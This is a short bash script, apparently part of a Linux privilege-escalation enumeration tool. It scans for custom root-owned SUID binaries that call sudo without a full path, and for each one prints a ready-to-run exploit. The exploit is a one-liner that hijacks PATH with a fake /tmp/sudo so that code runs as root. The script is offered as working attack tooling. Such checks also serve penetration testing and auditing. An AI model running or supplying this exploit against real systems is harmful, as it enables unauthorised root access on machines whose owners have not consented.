#!/bin/bash

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

csuidbin=$(find / -user root -perm -4000 -print 2>/dev/null | grep -v "/usr/*\|/bin/*")
if [ -n "$csuidbin" ]; then

    for value in $csuidbin; do
        srelpath=$(strings "$value" | grep -i sudo | grep -v "bin/sudo")
        if [ -n "$srelpath" ]; then
            echo -e "[+] ${RED}Custom SUID binary found with sudo command (no full path)${RESET}"
            echo -e "[+] ${YELLOW}It is possible to abuse environment path hijacking for the SUID binary:${RESET} $value"
            echo -e "[*] Exploit: export PATH=/tmp:\$PATH;echo '#!/bin/bash' > /tmp/sudo;echo 'id' >> /tmp/sudo; chmod +x /tmp/sudo; $value; rm /tmp/sudo"
            echo -e "[*] Don't forget to remove /tmp from PATH!\n"
        fi
    done

fi

